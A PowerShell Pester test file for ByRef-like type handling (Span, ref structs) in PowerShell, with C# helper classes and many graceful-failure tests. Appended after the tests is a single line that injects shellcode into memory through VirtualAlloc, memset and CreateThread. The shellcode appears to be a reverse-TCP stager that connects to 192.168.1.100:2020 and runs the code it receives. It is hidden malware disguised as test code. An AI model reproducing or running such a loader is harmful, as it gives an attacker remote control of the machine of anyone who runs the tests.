


Describe "Handle ByRef-like types gracefully" -Tags "CI" {

    BeforeAll {
        $code = @'
using System;
using System.Management.Automation;
namespace DotNetInterop
{
    public class Test
    {
        public Span<int> this[int i]
        {
            get { return default(Span<int>); }
            set { DoNothing(value); }
        }

        public static Span<int> Space
        {
            get { return default(Span<int>); }
            set { DoNothing(value); }
        }

        public Span<int> Room
        {
            get { return default(Span<int>); }
            set { DoNothing(value); }
        }

        private static void DoNothing(Span<int> param)
        {
        }

        public string PrintMySpan(string str, ReadOnlySpan<char> mySpan = default)
        {
            if (mySpan.Length == 0)
            {
                return str;
            }
            else
            {
                return str + mySpan.Length;
            }
        }

        public Span<int> GetSpan(int[] array)
        {
            return array.AsSpan();
        }
    }

    public class Test2
    {
        public Test2(ReadOnlySpan<char> span)
        {
            name = $"Number of chars: {span.Length}";
        }

        public Test2() {}

        private string name = "Hello World";
        public string this[ReadOnlySpan<char> span]
        {
            get { return name; }
            set { name = value; }
        }

        public string Name => name;
    }

    public class CodeMethods
    {
        public static ReadOnlySpan<char> GetProperty(PSObject instance)
        {
            return default(ReadOnlySpan<char>);
        }

        public static void SetProperty(PSObject instance, ReadOnlySpan<char> span)
        {
        }

        public static string RunMethod(PSObject instance, string str, ReadOnlySpan<char> span)
        {
            return str + span.Length;
        }
    }

    public ref struct MyByRefLikeType
    {
        public MyByRefLikeType(int i) { }
        public static int Index;
    }

    public class ExampleProblemClass
    {
        public void ProblemMethod(ref MyByRefLikeType value)
        {
        }
    }
}
'@
        if (-not ("DotNetInterop.Test" -as [type]))
        {
            Add-Type -TypeDefinition $code -IgnoreWarnings
        }

        $testObj = [DotNetInterop.Test]::new()
        $test2Obj = [DotNetInterop.Test2]::new()
    }

    It "New-Object should fail gracefully when used for a ByRef-like type" {
        { New-Object -TypeName 'System.Span[string]' } | Should -Throw -ErrorId "CannotInstantiateBoxedByRefLikeType,Microsoft.PowerShell.Commands.NewObjectCommand"
        { New-Object -TypeName 'DotNetInterop.MyByRefLikeType' } | Should -Throw -ErrorId "CannotInstantiateBoxedByRefLikeType,Microsoft.PowerShell.Commands.NewObjectCommand"
    }

    It "The 'new' method call should fail gracefully when used on a ByRef-like type" {
        { [System.Span[string]]::new() } | Should -Throw -ErrorId "CannotInstantiateBoxedByRefLikeType"
        { [DotNetInterop.MyByRefLikeType]::new() } | Should -Throw -ErrorId "CannotInstantiateBoxedByRefLikeType"
    }

    It "Calling constructor of a ByRef-like type via dotnet adapter should fail gracefully - <Number>" -TestCases @(
        @{ Number = 1; Script = { [System.Span[string]]::new.Invoke("abc") } }
        @{ Number = 2; Script = { [DotNetInterop.MyByRefLikeType]::new.Invoke(2) } }
    ) {
        param($Script)
        $expectedError = $null
        try {
            & $Script
        } catch {
            $expectedError = $_
        }

        $expectedError | Should -Not -BeNullOrEmpty
        $expectedError.Exception.InnerException.ErrorRecord.FullyQualifiedErrorId | Should -BeExactly "CannotInstantiateBoxedByRefLikeType"
    }

    It "Cast to a ByRef-like type should fail gracefully" {
        { [System.Span[int]] ([int[]]1,2,3) } | Should -Throw -ErrorId "InvalidCastToByRefLikeType"
        { [DotNetInterop.MyByRefLikeType] "text" } | Should -Throw -ErrorId "InvalidCastToByRefLikeType"
    }

    It "LanguagePrimitives.ConvertTo should fail gracefully for a ByRef-like type '<Name>'" -TestCases @(
        @{ Name = "Span";            Type = [System.Span[int]] }
        @{ Name = "MyByRefLikeType"; Type = [DotNetInterop.MyByRefLikeType] }
    ) {
        param($Type)
        $expectedError = $null
        try {
            [System.Management.Automation.LanguagePrimitives]::ConvertTo(([int[]]1,2,3), $Type)
        } catch {
            $expectedError = $_
        }

        $expectedError | Should -Not -BeNullOrEmpty
        $expectedError.Exception.InnerException.ErrorRecord.FullyQualifiedErrorId | Should -BeExactly "InvalidCastToByRefLikeType"
    }

    It "Getting value of a ByRef-like type instance property should not throw and should return null, even in strict mode - <Mechanism>" -TestCases @(
        @{ Mechanism = "Compiler/Binder"; Script = { [System.Text.Encoding]::ASCII.Preamble } }
        @{ Mechanism = "Dotnet-Adapter";  Script = { [System.Text.Encoding]::ASCII.PSObject.Properties["Preamble"].Value } }
    ) {
        param($Script)

        try {
            Set-StrictMode -Version latest
            & $Script | Should -Be $null
        } finally {
            Set-StrictMode -Off
        }
    }

    It "Setting value of a ByRef-like type instance property should fail gracefully - <Mechanism>" -TestCases @(
        @{ Mechanism = "Compiler/Binder"; Script = { $testObj.Room = [int[]](1,2,3) } }
        @{ Mechanism = "Dotnet-Adapter";  Script = { $testObj.PSObject.Properties["Room"].Value = [int[]](1,2,3) } }
    ) {
        param($Script)
        $Script | Should -Throw -ErrorId "CannotAccessByRefLikePropertyOrField"
    }

    It "<Action> value of a ByRef-like type static property should fail gracefully" -TestCases @(
        @{ Action = "Getting"; Script = { [DotNetInterop.Test]::Space } }
        @{ Action = "Setting"; Script = { [DotNetInterop.Test]::Space = "blah" } }
    ) {
        param($Script)
        $Script | Should -Throw -ErrorId "CannotAccessByRefLikePropertyOrField"
    }

    It "Invoke a method with optional ByRef-like parameter could work" {
        $testObj.PrintMySpan("Hello") | Should -BeExactly "Hello"
    }

    It "Invoke a method with ByRef-like parameter should fail gracefully - <Mechanism>" -TestCases @(
        @{ Mechanism = "Compiler/Binder"; Script = { $testObj.PrintMySpan("Hello", 1) } }
        @{ Mechanism = "Dotnet-Adapter";  Script = { $testObj.psobject.Methods["PrintMySpan"].Invoke("Hello", 1) } }
    ) {
        param($Script)
        $Script | Should -Throw -ErrorId "MethodArgumentConversionInvalidCastArgument"
    }

    It "Invoke a method with ByRef-like return type should fail gracefully - Compiler/Binder" {
        { $testObj.GetSpan([int[]]@(1,2,3)) } | Should -Throw -ErrorId "CannotCallMethodWithByRefLikeReturnType"
    }

    It "Invoke a method with ByRef-like return type should fail gracefully - Dotnet-Adapter" {
        $expectedError = $null
        try {
            $testObj.psobject.Methods["GetSpan"].Invoke([int[]]@(1,2,3))
        } catch {
            $expectedError = $_
        }
        $expectedError | Should -Not -BeNullOrEmpty
        $expectedError.Exception.InnerException.ErrorRecord.FullyQualifiedErrorId | Should -BeExactly "CannotCallMethodWithByRefLikeReturnType"
    }

    It "Access static property of a ByRef-like type" {
        [DotNetInterop.MyByRefLikeType]::Index = 10
        [DotNetInterop.MyByRefLikeType]::Index | Should -Be 10
    }

    It "Get access of an indexer that returns ByRef-like type should return null in no-strict mode" {
        $testObj[1] | Should -Be $null
    }

    It "Get access of an indexer that returns ByRef-like type should fail gracefully in strict mode" {
        try {
            Set-StrictMode -Version latest
            { $testObj[1] } | Should -Throw -ErrorId "CannotIndexWithByRefLikeReturnType"
        } finally {
            Set-StrictMode -Off
        }
    }

    It "Set access of an indexer that accepts ByRef-like type value should fail gracefully" {
        { $testObj[1] = 1 } | Should -Throw -ErrorId "CannotIndexWithByRefLikeReturnType"
    }

    It "Create instance of type with method that use a ByRef-like type as a ByRef parameter" {
        $obj = [DotNetInterop.ExampleProblemClass]::new()
        $obj | Should -BeOfType DotNetInterop.ExampleProblemClass
    }

    Context "Passing value that is implicitly/explicitly castable to ByRef-like parameter in method invocation" {
        
        BeforeAll {
            $ps = [powershell]::Create()

            
            $ps.AddCommand("Update-TypeData").
                AddParameter("TypeName", "DotNetInterop.Test2").
                AddParameter("MemberType", "CodeMethod").
                AddParameter("MemberName", "RunTest").
                AddParameter("Value", [DotNetInterop.CodeMethods].GetMethod('RunMethod')).Invoke()
            $ps.Commands.Clear()

            
            $ps.AddCommand("Update-TypeData").
                AddParameter("TypeName", "DotNetInterop.Test2").
                AddParameter("MemberType", "CodeProperty").
                AddParameter("MemberName", "TestName").
                AddParameter("Value", [DotNetInterop.CodeMethods].GetMethod('GetProperty')).
                AddParameter("SecondValue", [DotNetInterop.CodeMethods].GetMethod('SetProperty')).Invoke()
            $ps.Commands.Clear()

            $ps.AddScript('$test = [DotNetInterop.Test2]::new()').Invoke()
            $ps.Commands.Clear()
        }

        AfterAll {
            $ps.Dispose()
        }

        It "Support method calls with ByRef-like parameter as long as the argument can be casted to the ByRef-like type" {
            $testObj.PrintMySpan("abc", "def") | Should -BeExactly "abc3"
            $testObj.PrintMySpan("abc", "Hello".ToCharArray()) | Should -BeExactly "abc5"
            { $testObj.PrintMySpan("abc", 12) } | Should -Throw -ErrorId "MethodArgumentConversionInvalidCastArgument"

            $path = [System.IO.Path]::GetTempPath()
            [System.IO.Path]::IsPathRooted($path.ToCharArray()) | Should -Be $true
        }

        It "Support constructor calls with ByRef-like parameter as long as the argument can be casted to the ByRef-like type" {
            $result = [DotNetInterop.Test2]::new("abc")
            $result.Name | Should -BeExactly "Number of chars: 3"

            { [DotNetInterop.Test2]::new(12) } | Should -Throw -ErrorId "MethodCountCouldNotFindBest"
        }

        It "Support indexing operation with ByRef-like index as long as the argument can be casted to the ByRef-like type" {
            $test2Obj["abc"] | Should -BeExactly "Hello World"
            $test2Obj["abc"] = "pwsh"
            $test2Obj["abc"] | Should -BeExactly "pwsh"
        }

        It "Support CodeMethod with ByRef-like parameter as long as the argument can be casted to the ByRef-like type" {
            $result = $ps.AddScript('$test.RunTest("Hello", "World".ToCharArray())').Invoke()
            $ps.Commands.Clear()
            $result.Count | Should -Be 1
            $result[0] | Should -Be 'Hello5'
        }

        It "Return null for getter access of a CodeProperty that returns a ByRef-like type, even in strict mode" {
            $result = $ps.AddScript(
                'try { Set-StrictMode -Version latest; $test.TestName } finally { Set-StrictMode -Off }').Invoke()
            $ps.Commands.Clear()
            $result.Count | Should -Be 1
            $result[0] | Should -Be $null
        }

        It "Fail gracefully for setter access of a CodeProperty that returns a ByRef-like type" {
            $result = $ps.AddScript('$test.TestName = "Hello"').Invoke()
            $ps.Commands.Clear()
            $result.Count | Should -Be 0
            $ps.Streams.Error[0].FullyQualifiedErrorId | Should -Be "CannotAccessByRefLikePropertyOrField"
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x64,0x68,0x02,0x00,0x07,0xe4,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

